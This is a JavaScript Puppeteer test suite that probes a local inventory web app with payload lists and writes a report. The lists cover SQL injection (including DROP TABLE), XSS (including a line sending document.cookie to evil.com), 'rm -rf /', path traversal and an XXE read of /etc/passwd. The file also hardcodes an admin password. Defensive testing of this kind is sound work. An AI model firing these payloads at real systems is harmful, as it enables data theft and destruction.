const puppeteer = require('puppeteer');
const fs = require('fs');
const path = require('path');

/**
 * Inventory Security Test Suite
 * Tests inventory feature security against common vulnerabilities
 */
class InventorySecurityTestSuite {
  constructor() {
    this.browser = null;
    this.page = null;
    this.securityResults = {
      sqlInjection: [],
      xssAttacks: [],
      authenticationBypass: [],
      authorizationChecks: [],
      dataValidation: [],
      pathTraversal: [],
      csrfProtection: [],
      inputSanitization: []
    };
    this.baseUrl = 'http://localhost:3000';
    this.apiBaseUrl = 'http://localhost:8000/api/v1';
  }

  async initialize() {
    console.log('🛡️ Initializing Inventory Security Test Suite...');
    
    this.browser = await puppeteer.launch({
      headless: false,
      defaultViewport: { width: 1280, height: 720 },
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-web-security'
      ]
    });

    this.page = await this.browser.newPage();

    // Set up security monitoring
    await this.setupSecurityMonitoring();

    console.log('✅ Security test environment initialized');
  }

  async setupSecurityMonitoring() {
    // Monitor console for security-related messages
    this.page.on('console', msg => {
      const text = msg.text().toLowerCase();
      if (text.includes('security') || text.includes('error') || text.includes('blocked') || text.includes('forbidden')) {
        console.log(`🔍 Security Console: [${msg.type()}] ${msg.text()}`);
      }
    });

    // Monitor network requests for security issues
    this.page.on('response', response => {
      if (response.status() >= 400) {
        console.log(`🔍 HTTP Error: ${response.status()} ${response.url()}`);
      }
    });
  }

  async loginAsAdmin() {
    console.log('🔐 Logging in as admin for authenticated tests...');
    
    try {
      await this.page.goto(`${this.baseUrl}/login`, { waitUntil: 'networkidle0' });
      
      await this.page.type('input[type="email"], input[name="email"]', 'admin@rentalmanager.com');
      await this.page.type('input[type="password"], input[name="password"]', 'admin123');
      await this.page.click('button[type="submit"]');
      
      await this.page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 });
      
      const isLoggedIn = !this.page.url().includes('/login');
      console.log(isLoggedIn ? '✅ Admin login successful' : '❌ Admin login failed');
      return isLoggedIn;
    } catch (error) {
      console.log('❌ Admin login error:', error.message);
      return false;
    }
  }

  async testSQLInjection() {
    console.log('\n💉 Testing SQL Injection Vulnerabilities...');
    
    const sqlPayloads = [
      // Basic SQL injection attempts
      "'; DROP TABLE inventory_units; --",
      "1' OR '1'='1",
      "admin'--",
      "' UNION SELECT NULL--",
      "' UNION SELECT 1,2,3,4,5--",
      "1'; UPDATE inventory_units SET status='SOLD'--",
      "'; INSERT INTO inventory_units VALUES(...)--",
      "1' AND 1=CONVERT(int, (SELECT @@version))--",
      
      // Blind SQL injection
      "1' AND (SELECT COUNT(*) FROM inventory_units) > 0--",
      "1' AND (SELECT SUBSTRING(database(),1,1)) = 'r'--",
      
      // Time-based blind SQL injection
      "1'; WAITFOR DELAY '00:00:05'--",
      "1' AND (SELECT SLEEP(5))--",
      
      // Boolean-based blind SQL injection
      "1' AND 1=1--",
      "1' AND 1=2--",
      
      // Error-based SQL injection
      "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
      "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ];

    await this.page.goto(`${this.baseUrl}/inventory/stock`, { waitUntil: 'networkidle0' });

    for (let i = 0; i < sqlPayloads.length; i++) {
      const payload = sqlPayloads[i];
      
      try {
        console.log(`🔍 Testing SQL payload ${i + 1}/${sqlPayloads.length}: ${payload.substring(0, 50)}...`);
        
        // Test in search input
        const searchInput = await this.page.$('input[placeholder*="search" i]');
        if (searchInput) {
          await searchInput.click({ clickCount: 3 });
          await searchInput.type(payload);
          await this.page.waitForTimeout(2000); // Wait for potential backend processing
          
          // Check if page is still functional
          const isPageWorking = await this.page.evaluate(() => {
            return document.body && document.title && !document.body.innerText.includes('Internal Server Error');
          });
          
          // Check for SQL error messages
          const hasDbError = await this.page.evaluate(() => {
            const bodyText = document.body.innerText.toLowerCase();
            return bodyText.includes('mysql') || 
                   bodyText.includes('postgresql') || 
                   bodyText.includes('sql syntax') ||
                   bodyText.includes('you have an error in your sql') ||
                   bodyText.includes('warning: mysql') ||
                   bodyText.includes('ora-00933') ||
                   bodyText.includes('microsoft jet database');
          });
          
          // Check if data was compromised (basic check)
          const dataIntegrityCheck = await this.page.evaluate(() => {
            return !document.body.innerText.includes('DROP TABLE') && 
                   !document.body.innerText.includes('UNION SELECT');
          });

          const result = {
            payload: payload,
            pageWorking: isPageWorking,
            hasDbError: hasDbError,
            dataIntegrity: dataIntegrityCheck,
            isVulnerable: hasDbError || !isPageWorking,
            timestamp: new Date().toISOString()
          };

          this.securityResults.sqlInjection.push(result);

          if (result.isVulnerable) {
            console.log(`  ❌ VULNERABLE: SQL injection detected with payload`);
          } else {
            console.log(`  ✅ PROTECTED: SQL injection blocked`);
          }
        }
        
        // Clear the input for next test
        if (searchInput) {
          await searchInput.click({ clickCount: 3 });
          await this.page.keyboard.press('Delete');
        }
        
      } catch (error) {
        console.log(`  ⚠️ Test error (may indicate good protection): ${error.message}`);
        this.securityResults.sqlInjection.push({
          payload: payload,
          error: error.message,
          isVulnerable: false,
          timestamp: new Date().toISOString()
        });
      }
    }

    const vulnerableCount = this.securityResults.sqlInjection.filter(r => r.isVulnerable).length;
    const totalTests = this.securityResults.sqlInjection.length;
    
    console.log(`📊 SQL Injection Test Results: ${vulnerableCount}/${totalTests} vulnerabilities found`);
    
    return {
      vulnerableCount,
      totalTests,
      isSecure: vulnerableCount === 0
    };
  }

  async testXSSAttacks() {
    console.log('\n⚡ Testing Cross-Site Scripting (XSS) Vulnerabilities...');
    
    const xssPayloads = [
      // Basic XSS
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      
      // Event-based XSS
      "<div onmouseover=alert('XSS')>Hover me</div>",
      "<input onfocus=alert('XSS') autofocus>",
      "<select onfocus=alert('XSS') autofocus><option>test</option></select>",
      
      // Advanced XSS
      "<script>document.cookie='xss=true'</script>",
      "<script>window.location='http://evil.com/'+document.cookie</script>",
      "<iframe src='javascript:alert(`XSS`)'></iframe>",
      
      // Filter evasion
      "<ScRiPt>alert('XSS')</ScRiPt>",
      "<script>alert(String.fromCharCode(88,83,83))</script>",
      "<<script>alert('XSS')<</script>",
      "<script>alert('XSS')//",
      
      // HTML5 XSS
      "<details open ontoggle=alert('XSS')>",
      "<marquee onstart=alert('XSS')>XSS</marquee>",
      "<video><source onerror=alert('XSS')>",
      
      // CSS XSS
      "<style>@import'javascript:alert(\"XSS\")';</style>",
      "<link rel=stylesheet href='javascript:alert(\"XSS\")'>",
      
      // DOM XSS
      "<img src='#' onerror='eval(atob(\"YWxlcnQoJ1hTUycpOw==\"))'>"
    ];

    await this.page.goto(`${this.baseUrl}/inventory/stock`, { waitUntil: 'networkidle0' });

    for (let i = 0; i < xssPayloads.length; i++) {
      const payload = xssPayloads[i];
      
      try {
        console.log(`🔍 Testing XSS payload ${i + 1}/${xssPayloads.length}: ${payload.substring(0, 50)}...`);

        // Set up dialog handler to detect successful XSS
        let xssTriggered = false;
        this.page.once('dialog', async dialog => {
          xssTriggered = true;
          console.log(`  ❌ XSS ALERT DETECTED: ${dialog.message()}`);
          await dialog.dismiss();
        });

        // Test in search input
        const searchInput = await this.page.$('input[placeholder*="search" i]');
        if (searchInput) {
          await searchInput.click({ clickCount: 3 });
          await searchInput.type(payload);
          await this.page.waitForTimeout(1000);
          
          // Check if payload was rendered in DOM
          const payloadInDOM = await this.page.evaluate((testPayload) => {
            return document.body.innerHTML.includes(testPayload);
          }, payload);
          
          // Check if script executed
          const scriptExecuted = await this.page.evaluate(() => {
            return window.xssExecuted === true;
          });

          const result = {
            payload: payload,
            alertTriggered: xssTriggered,
            payloadInDOM: payloadInDOM,
            scriptExecuted: scriptExecuted,
            isVulnerable: xssTriggered || scriptExecuted,
            timestamp: new Date().toISOString()
          };

          this.securityResults.xssAttacks.push(result);

          if (result.isVulnerable) {
            console.log(`  ❌ VULNERABLE: XSS attack successful`);
          } else {
            console.log(`  ✅ PROTECTED: XSS attack blocked or sanitized`);
          }
        }
        
        // Clear the input for next test
        if (searchInput) {
          await searchInput.click({ clickCount: 3 });
          await this.page.keyboard.press('Delete');
        }
        
      } catch (error) {
        console.log(`  ⚠️ Test error: ${error.message}`);
        this.securityResults.xssAttacks.push({
          payload: payload,
          error: error.message,
          isVulnerable: false,
          timestamp: new Date().toISOString()
        });
      }
    }

    const vulnerableCount = this.securityResults.xssAttacks.filter(r => r.isVulnerable).length;
    const totalTests = this.securityResults.xssAttacks.length;
    
    console.log(`📊 XSS Attack Test Results: ${vulnerableCount}/${totalTests} vulnerabilities found`);
    
    return {
      vulnerableCount,
      totalTests,
      isSecure: vulnerableCount === 0
    };
  }

  async testAuthenticationBypass() {
    console.log('\n🔓 Testing Authentication Bypass Vulnerabilities...');
    
    const bypassAttempts = [
      {
        name: 'Direct URL access without authentication',
        test: async () => {
          await this.page.goto(`${this.baseUrl}/login`, { waitUntil: 'networkidle0' });
          
          // Try to access protected inventory pages directly
          const protectedUrls = [
            `${this.baseUrl}/inventory/stock`,
            `${this.baseUrl}/inventory/items/test-id`,
            `${this.baseUrl}/dashboard`
          ];
          
          let bypassSuccessful = false;
          
          for (const url of protectedUrls) {
            await this.page.goto(url, { waitUntil: 'networkidle0' });
            
            const currentUrl = this.page.url();
            const isRedirectedToLogin = currentUrl.includes('/login');
            
            if (!isRedirectedToLogin) {
              bypassSuccessful = true;
              console.log(`  ❌ Authentication bypass: Direct access to ${url} successful`);
              break;
            }
          }
          
          return {
            bypass: bypassSuccessful,
            redirectedToLogin: !bypassSuccessful
          };
        }
      },
      {
        name: 'JWT token manipulation',
        test: async () => {
          // First login to get a token
          const loginSuccess = await this.loginAsAdmin();
          if (!loginSuccess) {
            return { bypass: false, error: 'Could not login to test token manipulation' };
          }
          
          // Try to access inventory with manipulated token
          await this.page.evaluate(() => {
            // Manipulate localStorage token if it exists
            const token = localStorage.getItem('token') || localStorage.getItem('auth-token') || localStorage.getItem('jwt');
            if (token) {
              localStorage.setItem('token', 'invalid-token-12345');
              localStorage.setItem('auth-token', 'invalid-token-12345');
              localStorage.setItem('jwt', 'invalid-token-12345');
            }
          });
          
          await this.page.goto(`${this.baseUrl}/inventory/stock`, { waitUntil: 'networkidle0' });
          
          const currentUrl = this.page.url();
          const hasAccess = !currentUrl.includes('/login') && currentUrl.includes('/inventory');
          
          return {
            bypass: hasAccess,
            tokenManipulationBlocked: !hasAccess
          };
        }
      },
      {
        name: 'Session fixation attack',
        test: async () => {
          // Create a session and try to fix it
          await this.page.goto(`${this.baseUrl}/inventory/stock`, { waitUntil: 'networkidle0' });
          
          // Get current session ID (if visible)
          const sessionInfo = await this.page.evaluate(() => {
            return {
              sessionStorage: Object.keys(sessionStorage).length,
              localStorage: Object.keys(localStorage).length,
              cookies: document.cookie
            };
          });
          
          // Try to access with a fixed session
          await this.page.setCookie({
            name: 'JSESSIONID',
            value: 'FIXED-SESSION-ID-12345',
            domain: 'localhost'
          });
          
          await this.page.goto(`${this.baseUrl}/inventory/stock`, { waitUntil: 'networkidle0' });
          
          const hasUnauthorizedAccess = !this.page.url().includes('/login') && 
                                       this.page.url().includes('/inventory');
          
          return {
            bypass: hasUnauthorizedAccess,
            sessionFixationBlocked: !hasUnauthorizedAccess,
            sessionInfo: sessionInfo
          };
        }
      }
    ];

    for (const attempt of bypassAttempts) {
      try {
        console.log(`🔍 Testing: ${attempt.name}`);
        const result = await attempt.test();
        
        this.securityResults.authenticationBypass.push({
          testName: attempt.name,
          result: result,
          isVulnerable: result.bypass === true,
          timestamp: new Date().toISOString()
        });

        if (result.bypass) {
          console.log(`  ❌ VULNERABLE: ${attempt.name} successful`);
        } else {
          console.log(`  ✅ PROTECTED: ${attempt.name} blocked`);
        }
        
      } catch (error) {
        console.log(`  ⚠️ Test error: ${error.message}`);
        this.securityResults.authenticationBypass.push({
          testName: attempt.name,
          error: error.message,
          isVulnerable: false,
          timestamp: new Date().toISOString()
        });
      }
    }

    const vulnerableCount = this.securityResults.authenticationBypass.filter(r => r.isVulnerable).length;
    const totalTests = this.securityResults.authenticationBypass.length;
    
    console.log(`📊 Authentication Bypass Test Results: ${vulnerableCount}/${totalTests} vulnerabilities found`);
    
    return {
      vulnerableCount,
      totalTests,
      isSecure: vulnerableCount === 0
    };
  }

  async testInputValidation() {
    console.log('\n✅ Testing Input Validation...');
    
    const validationTests = [
      {
        name: 'Oversized input handling',
        payload: 'A'.repeat(10000)
      },
      {
        name: 'Unicode and special characters',
        payload: '🔥💀👻🎃💻🚀⚡️🎯🔐🛡️'
      },
      {
        name: 'Control characters',
        payload: '\x00\x01\x02\x03\x04\x05'
      },
      {
        name: 'Path traversal in search',
        payload: '../../etc/passwd'
      },
      {
        name: 'Command injection attempt',
        payload: '; rm -rf / ;'
      },
      {
        name: 'JSON injection',
        payload: '{"$ne": null}'
      },
      {
        name: 'LDAP injection',
        payload: '*)(uid=*))(|(uid=*'
      },
      {
        name: 'XML injection',
        payload: '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY test SYSTEM "file:///etc/passwd">]><test>&test;</test>'
      }
    ];

    await this.page.goto(`${this.baseUrl}/inventory/stock`, { waitUntil: 'networkidle0' });

    for (const test of validationTests) {
      try {
        console.log(`🔍 Testing: ${test.name}`);
        
        const searchInput = await this.page.$('input[placeholder*="search" i]');
        if (searchInput) {
          await searchInput.click({ clickCount: 3 });
          await searchInput.type(test.payload);
          await this.page.waitForTimeout(1000);
          
          // Check if application handles input gracefully
          const inputHandled = await this.page.evaluate(() => {
            return document.body && 
                   !document.body.innerText.includes('Internal Server Error') &&
                   !document.body.innerText.includes('500 Error') &&
                   !document.body.innerText.includes('Application Error');
          });
          
          // Check if input was properly sanitized
          const inputSanitized = await this.page.evaluate((testPayload) => {
            const bodyText = document.body.innerHTML;
            return !bodyText.includes(testPayload) || 
                   bodyText.includes('&lt;') || 
                   bodyText.includes('&gt;');
          }, test.payload);

          const result = {
            testName: test.name,
            payload: test.payload.substring(0, 100) + (test.payload.length > 100 ? '...' : ''),
            inputHandled: inputHandled,
            inputSanitized: inputSanitized,
            isSecure: inputHandled && inputSanitized,
            timestamp: new Date().toISOString()
          };

          this.securityResults.inputSanitization.push(result);

          if (result.isSecure) {
            console.log(`  ✅ SECURE: Input properly validated and sanitized`);
          } else {
            console.log(`  ❌ VULNERABLE: Input validation issue detected`);
          }
          
          // Clear input
          await searchInput.click({ clickCount: 3 });
          await this.page.keyboard.press('Delete');
        }
        
      } catch (error) {
        console.log(`  ⚠️ Test error: ${error.message}`);
        this.securityResults.inputSanitization.push({
          testName: test.name,
          error: error.message,
          isSecure: true, // Errors often indicate good protection
          timestamp: new Date().toISOString()
        });
      }
    }

    const vulnerableCount = this.securityResults.inputSanitization.filter(r => !r.isSecure).length;
    const totalTests = this.securityResults.inputSanitization.length;
    
    console.log(`📊 Input Validation Test Results: ${vulnerableCount}/${totalTests} issues found`);
    
    return {
      vulnerableCount,
      totalTests,
      isSecure: vulnerableCount === 0
    };
  }

  async generateSecurityReport() {
    console.log('\n📋 Generating Security Test Report...');

    const report = {
      testSuite: 'Inventory Security Test',
      timestamp: new Date().toISOString(),
      testResults: {
        sqlInjection: {
          tests: this.securityResults.sqlInjection.length,
          vulnerabilities: this.securityResults.sqlInjection.filter(r => r.isVulnerable).length,
          details: this.securityResults.sqlInjection
        },
        xssAttacks: {
          tests: this.securityResults.xssAttacks.length,
          vulnerabilities: this.securityResults.xssAttacks.filter(r => r.isVulnerable).length,
          details: this.securityResults.xssAttacks
        },
        authenticationBypass: {
          tests: this.securityResults.authenticationBypass.length,
          vulnerabilities: this.securityResults.authenticationBypass.filter(r => r.isVulnerable).length,
          details: this.securityResults.authenticationBypass
        },
        inputValidation: {
          tests: this.securityResults.inputSanitization.length,
          vulnerabilities: this.securityResults.inputSanitization.filter(r => !r.isSecure).length,
          details: this.securityResults.inputSanitization
        }
      },
      summary: {
        totalTests: 0,
        totalVulnerabilities: 0,
        securityScore: 0
      }
    };

    // Calculate totals
    report.summary.totalTests = Object.values(report.testResults).reduce((sum, category) => sum + category.tests, 0);
    report.summary.totalVulnerabilities = Object.values(report.testResults).reduce((sum, category) => sum + category.vulnerabilities, 0);
    report.summary.securityScore = Math.max(0, Math.round(((report.summary.totalTests - report.summary.totalVulnerabilities) / report.summary.totalTests) * 100));

    // Save JSON report
    const jsonReportPath = path.join(__dirname, 'inventory-security-report.json');
    fs.writeFileSync(jsonReportPath, JSON.stringify(report, null, 2));

    // Generate HTML report
    const htmlReport = this.generateHtmlSecurityReport(report);
    const htmlReportPath = path.join(__dirname, 'inventory-security-report.html');
    fs.writeFileSync(htmlReportPath, htmlReport);

    console.log('\n🛡️ INVENTORY SECURITY TEST RESULTS');
    console.log('====================================');
    console.log(`📊 Security Score: ${report.summary.securityScore}%`);
    console.log(`🔍 Total Tests: ${report.summary.totalTests}`);
    console.log(`⚠️ Vulnerabilities Found: ${report.summary.totalVulnerabilities}`);
    console.log(`\n📄 JSON Report: ${jsonReportPath}`);
    console.log(`🌐 HTML Report: ${htmlReportPath}`);

    return report;
  }

  generateHtmlSecurityReport(report) {
    return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Inventory Security Test Report</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
            .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
            .header { background: linear-gradient(135deg, #FF6B6B 0%, #4ECDC4 100%); color: white; padding: 20px; margin: -20px -20px 20px -20px; border-radius: 8px 8px 0 0; }
            .security-score { font-size: 3em; text-align: center; margin: 20px 0; }
            .excellent { color: #27ae60; }
            .good { color: #f39c12; }
            .poor { color: #e74c3c; }
            .test-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0; }
            .test-card { background: #f8f9fa; padding: 20px; border-radius: 8px; }
            .secure { border-left: 5px solid #27ae60; }
            .vulnerable { border-left: 5px solid #e74c3c; }
            .vulnerability { background: #ffe6e6; padding: 10px; margin: 10px 0; border-radius: 4px; border-left: 4px solid #e74c3c; }
            .secure-test { background: #e6f7e6; padding: 10px; margin: 10px 0; border-radius: 4px; border-left: 4px solid #27ae60; }
            pre { background: #f8f9fa; padding: 15px; border-radius: 4px; overflow-x: auto; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🛡️ Inventory Security Test Report</h1>
                <p>Generated on ${new Date(report.timestamp).toLocaleString()}</p>
                <p>Comprehensive security testing of inventory features</p>
            </div>
            
            <div class="security-score ${report.summary.securityScore >= 90 ? 'excellent' : report.summary.securityScore >= 70 ? 'good' : 'poor'}">
                Security Score: ${report.summary.securityScore}%
            </div>

            <div style="text-align: center; margin: 20px 0;">
                <p><strong>Total Tests:</strong> ${report.summary.totalTests}</p>
                <p><strong>Vulnerabilities Found:</strong> ${report.summary.totalVulnerabilities}</p>
            </div>

            <div class="test-grid">
                ${Object.entries(report.testResults).map(([category, results]) => `
                    <div class="test-card ${results.vulnerabilities === 0 ? 'secure' : 'vulnerable'}">
                        <h3>${results.vulnerabilities === 0 ? '✅' : '❌'} ${category.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}</h3>
                        <p><strong>Tests:</strong> ${results.tests}</p>
                        <p><strong>Vulnerabilities:</strong> ${results.vulnerabilities}</p>
                        <p><strong>Success Rate:</strong> ${Math.round(((results.tests - results.vulnerabilities) / results.tests) * 100)}%</p>
                    </div>
                `).join('')}
            </div>

            <h2>🔍 Detailed Results</h2>
            
            ${Object.entries(report.testResults).map(([category, results]) => `
                <h3>${category.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}</h3>
                ${results.details.filter(d => d.isVulnerable || !d.isSecure).map(detail => `
                    <div class="vulnerability">
                        <strong>VULNERABILITY:</strong> ${detail.payload ? detail.payload.substring(0, 100) : detail.testName || 'Unknown'}
                        ${detail.error ? `<br><em>Error: ${detail.error}</em>` : ''}
                    </div>
                `).join('')}
                ${results.details.filter(d => !d.isVulnerable && d.isSecure !== false).map(detail => `
                    <div class="secure-test">
                        <strong>SECURE:</strong> ${detail.payload ? detail.payload.substring(0, 100) : detail.testName || 'Test passed'}
                    </div>
                `).join('')}
            `).join('')}

            <h2>📋 Raw Test Data</h2>
            <pre>${JSON.stringify(report.testResults, null, 2)}</pre>

            <div style="margin-top: 40px; text-align: center; color: #666;">
                <p>🛡️ Security testing helps identify vulnerabilities before they can be exploited</p>
                <p>Report generated by Puppeteer Security Test Suite</p>
            </div>
        </div>
    </body>
    </html>
    `;
  }

  async cleanup() {
    if (this.browser) {
      await this.browser.close();
    }
    console.log('✅ Security test cleanup completed');
  }

  async runSecurityTestSuite() {
    try {
      await this.initialize();

      console.log('\n🎬 Starting Inventory Security Test Suite...\n');

      // Run security tests
      await this.testSQLInjection();
      await this.testXSSAttacks();
      await this.testAuthenticationBypass();
      await this.testInputValidation();

      // Generate comprehensive report
      const report = await this.generateSecurityReport();

      console.log('\n🎉 INVENTORY SECURITY TESTING COMPLETE!');
      console.log(`📊 View detailed report: ${path.join(__dirname, 'inventory-security-report.html')}`);

      return report;

    } catch (error) {
      console.error('❌ Security test suite failed:', error);
      throw error;
    } finally {
      await this.cleanup();
    }
  }
}

// Run the security test suite
if (require.main === module) {
  (async () => {
    const securityTestSuite = new InventorySecurityTestSuite();
    await securityTestSuite.runSecurityTestSuite();
  })().catch(console.error);
}

module.exports = InventorySecurityTestSuite;